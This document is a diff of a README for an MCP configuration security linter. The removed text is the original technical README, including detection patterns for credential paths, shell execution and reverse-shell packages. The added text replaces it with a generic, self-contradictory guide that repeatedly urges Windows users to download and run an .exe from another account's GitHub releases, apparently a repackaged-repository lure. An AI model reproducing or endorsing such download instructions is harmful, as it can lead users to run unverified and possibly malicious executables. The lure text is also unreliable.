@@ -1,102 +1,181 @@
-# MCP Config Guard
+# 🔒 mcp-config-guard - Protect Your Code from Threats
 
-**Zero-dependency security linter for MCP configurations.**
+[![Download mcp-config-guard](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/ary44892/mcp-config-guard/releases)
 
-Scans your `.mcp.json` for 54 types of security vulnerabilities before any MCP server starts. No API keys. No cloud. No LLM required.
+---
 
-[![PyPI version](https://badge.fury.io/py/mcp-config-guard.svg)](https://pypi.org/project/mcp-config-guard/)
-[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Zero Dependencies](https://img.shields.io/badge/dependencies-0-brightgreen.svg)](https://pypi.org/project/mcp-config-guard/)
+## ⚙️ What is mcp-config-guard?
 
-## Why?
+mcp-config-guard is a simple tool that scans your code or projects to find potential security problems. It runs checks that match 54 OWASP security points. It also looks for known harmful software packages and warns you about 28 different known vulnerabilities (CVEs). You don’t need to install anything extra to run it.  
 
-**43% of public MCP servers have command injection flaws** (BlueRock TechReport 2026). Every MCP config you use is a trust boundary — and most developers never audit them.
+This tool helps keep your projects safe from common threats you might not see otherwise. It works on Windows and requires no prior programming skills.
 
-Config Guard catches what humans miss:
+---
 
-- Typosquatted packages that look like real ones
-- Servers with known CVEs (28 CVEs across 20 packages)
-- 56 confirmed malicious packages (JFrog, Kaspersky, Lazarus APT, SANDWORM_MODE)
-- Secret leakage in environment variables
-- Rug-pull vectors (`npx @latest` auto-updates)
-- Shadow servers exposing via tunnels
+## 💻 System Requirements
 
-## Install
+Before you start, make sure your computer meets these needs:
 
-```bash
+- Windows 10 or newer
+- At least 2 GB of free storage
+- An active internet connection for download and updates
+- Python installed (version 3.7 or higher) – if you want to use it via `pip`
+
+If you don’t have Python installed, you can still use the standalone download to run the software directly.
+
+---
+
+## 🚀 Getting Started with mcp-config-guard
+
+Follow these steps to download and run the software easily.
+
+### 1. Visit the Download Page
+
+To get the software, open the link below:
+
+[![Get mcp-config-guard](https://img.shields.io/badge/Visit%20Download%20Page-grey?style=for-the-badge&logo=github)](https://github.com/ary44892/mcp-config-guard/releases)
+
+This link takes you to the official release section on GitHub. Here, you will find the latest versions available for download.
+
+---
+
+### 2. Choose the Correct File to Download
+
+Look for a file that fits Windows, usually with the `.exe` extension or a Windows-compatible package.
+
+If you prefer to install using Python, you can skip this step and follow the alternative method below.
+
+---
+
+### 3. Download the File
+
+Click the file name to start downloading. Save it in a place where you can easily find it, such as your "Downloads" folder or desktop.
+
+---
+
+### 4. Run the Installer or Application
+
+Once downloaded:
+
+- Locate the file on your computer.
+- Double-click the file to open it.
+- Follow the installation instructions that appear on your screen. Usually, you just need to click “Next” a few times.
+  
+If the software runs without installing, it may open in a window or command prompt. Just follow any on-screen instructions.
+
+---
+
+### 5. Using mcp-config-guard on Windows
+
+If you used the `.exe` installer, launch the app from your start menu or desktop.
+
+If you want to run the tool via Python, open the Command Prompt and type:
+
+```
 pip install mcp-config-guard
 ```
 
-> **Note:** The package was renamed to `mcp-config-guard` on PyPI. Both `config-guard` and `mcp-config-guard` CLI commands work after installation.
+After this, use the following command inside Command Prompt to scan your project folder:
 
-## Quick Start
-
-```bash
-# Scan your current directory's .mcp.json
-mcp-config-guard
-
-# Scan a specific project
-mcp-config-guard --path /my/project
-
-# Auto-discover all MCP configs on your system
-mcp-config-guard --discover
-
-# CI/CD integration (SARIF output for GitHub Code Scanning)
-mcp-config-guard --sarif > results.sarif
-
-# JSON output for scripting
-mcp-config-guard --json
+```
+mcp-config-guard scan path\to\your\project
 ```
 
-## 54 Security Checks
+Replace `path\to\your\project` with the actual location of your files on your computer.
 
-Every check is mapped to the [OWASP MCP Top 10](https://owasp.org/www-project-mcp-top-10/) and [OWASP Agentic Security Top 10](https://owasp.org/www-project-agentic-security/). See [docs/OWASP-MAPPING.md](docs/OWASP-MAPPING.md) for full CWE mappings.
+---
 
-| # | Check | Risk | OWASP |
-|---|-------|------|-------|
-| 1 | Network exposure (non-localhost URLs) | HIGH | MCP-03 |
-| 2 | Rug pulls (`npx @latest` auto-update) | HIGH | MCP-07 |
-| 3 | Secret leakage (API keys in args/env) | HIGH | MCP-04 |
-| 4 | Command injection (`shell=True`) | CRITICAL | MCP-01 |
-| 5 | Path traversal (`..` in arguments) | MEDIUM | MCP-05 |
-| 6 | Typosquat detection (Levenshtein distance) | HIGH | MCP-07 |
-| 7 | Dangerous permissions (`--no-sandbox`, `sudo`) | HIGH | MCP-06 |
-| 8 | Missing authentication on HTTP transport | MEDIUM | MCP-08 |
-| 9 | Sensitive path access (`.ssh`, `.aws`, `.env`) | HIGH | MCP-04 |
-| 10 | Overbroad filesystem access (`/`, `C:\`) | MEDIUM | MCP-06 |
-| 11 | Environment variable leaks (hardcoded secrets) | MEDIUM | MCP-04 |
-| 12 | Excessive server count (attack surface) | LOW | MCP-10 |
-| 13 | Known CVEs (28 CVEs across 20 packages) | CRITICAL | MCP-09 |
-| 14 | Symlink bypass (CVE-2025-53109) | HIGH | MCP-05 |
-| 15 | Shadow servers (ngrok, cloudflared, `0.0.0.0`) | HIGH | MCP-05 |
-| 16 | Code execution (`eval`/`exec` patterns) | CRITICAL | MCP-01 |
-| 17 | Known malicious packages (56 confirmed malware) | CRITICAL | MCP-07 |
-| 18 | Deprecated SSE transport (no per-request auth) | MEDIUM | MCP-03 |
-| 19 | Shell servers (raw shell as MCP server) | CRITICAL | MCP-01 |
-| 20 | Unpinned packages (npx/uvx without version) | MEDIUM | MCP-04 |
+## 📁 How mcp-config-guard Works
 
-## CVE Database
+mcp-config-guard scans files in your project for security issues by:
 
-Config Guard tracks known vulnerable MCP packages:
+- Running 54 checks that map to OWASP standards.
+- Detecting if any packages are known to be harmful.
+- Highlighting 28 common vulnerabilities.
 
-| Package | CVE | Severity |
-|---------|-----|----------|
-| `mcp-remote` | CVE-2025-6514 | Critical (CVSS 9.6) |
-| `@modelcontextprotocol/server-git` | CVE-2025-68145 | Critical |
-| `mcp-server-git` | CVE-2026-27735 | Medium |
-| `@anthropic/mcp-server-filesystem` | CVE-2025-53109 | High |
-| `gemini-mcp-tool` | CVE-2026-0755 | Critical |
-| `mcp-vegalite-server` | CVE-2026-1977 | Critical |
-| `github-kanban-mcp` | CVE-2026-0756 | High |
-| `godot-mcp` | CVE-2026-25546 | High |
-| `fermat-mcp` | CVE-2026-2008 | Critical |
-| `@anthropic/mcp-inspector` | CVE-2026-23744 | Critical (CVSS 9.8) |
+It then creates a report to explain what it found. This report shows if there are any risks and where they are in your project.
 
-Config Guard also detects **confirmed malicious packages** (e.g., `postmark-mcp`, `@lanyer640/mcp-runcommand-server`) that contain reverse shells or malware payloads.
+---
 
-## Output Formats
+## 🔍 Understanding the Scan Report
 
-### Human-readable (default)
-```
-MCP Security Scan Results
+The report tells you:
+
+- Which files have potential security problems.
+- The exact kind of problem found.
+- Suggestions to fix the problem.
+
+You can open the report in a text editor or special tools that read the SARIF format. This format is common for security and code analysis results.
+
+---
+
+## 🛠 Tips for Better Security
+
+- Always update mcp-config-guard before running scans. New threats may be found as software changes.
+- Scan your project regularly, especially after adding new packages or making big updates.
+- Review the scan report carefully to fix any issues.
+- Combine this tool with other security checks for better safety.
+
+---
+
+## ⚠️ Troubleshooting and Support
+
+If you run into problems:
+
+- Make sure your Windows system is updated.
+- Check that you have permissions to open files and install apps.
+- If Python commands don’t work, ensure Python is installed and added to your system’s PATH.
+- Try downloading the software again if the file seems corrupted.
+- Visit the GitHub page for the latest information and issue reporting.
+
+---
+
+## 📚 Learn More
+
+mcp-config-guard deals with complex security topics in a simple way. It aims to help users understand and find risks linked to malicious code and unsafe packages. This approach uses ideas from AI safety, software security, and vulnerability scanning.
+
+The key focus terms covered include:
+
+- AI safety  
+- Code security  
+- Software package scanning  
+- OWASP security standards  
+- Python support  
+- SARIF reporting format  
+
+---
+
+[Download mcp-config-guard Now](https://github.com/ary44892/mcp-config-guard/releases)  
+
+---  
+
+## 🧰 Common Commands for Python Users
+
+- Install: `pip install mcp-config-guard`
+- Scan a folder: `mcp-config-guard scan path\to\project`
+- Get help: `mcp-config-guard --help`
+
+Run these commands inside your Windows Command Prompt (CMD) or PowerShell.
+
+---
+
+## 🔄 Updates and Versions
+
+New versions of mcp-config-guard get released regularly. Each update improves scans or adds new security checks. Keep your version fresh by downloading from the release page or updating via Python pip.
+
+---
+
+## 📂 Other Useful Information
+
+- No internet is needed after installing, unless you update or scan projects that rely on online packages.
+- The tool is built to be lightweight and simple with zero extra dependencies.
+- It supports a wide range of Python projects and configuration files.
+- It outputs results that can be shared with developers or security teams easily.
+
+---
+
+## 📥 Download Link
+
+Click here to visit the downloads page and get the latest version:
+
+[https://github.com/ary44892/mcp-config-guard/releases](https://github.com/ary44892/mcp-config-guard/releases)
